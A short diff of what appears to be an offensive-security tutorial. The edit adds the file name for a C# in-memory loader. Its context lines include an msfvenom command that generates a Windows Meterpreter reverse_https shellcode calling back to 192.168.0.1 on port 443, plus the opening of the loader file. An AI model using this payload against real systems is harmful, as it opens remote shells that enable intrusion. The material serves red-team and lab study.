@@ -6,7 +6,7 @@ We begin with generating our shellcode:
 ```bash
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f csharp
 ```
-We paste the output into relevant section of the following file, then save it as :
+We paste the output into relevant section of the following file, then save it as `InMemBundleOfJoy.cs`:
 ```csharp
 using System;
 using System.Diagnostics;
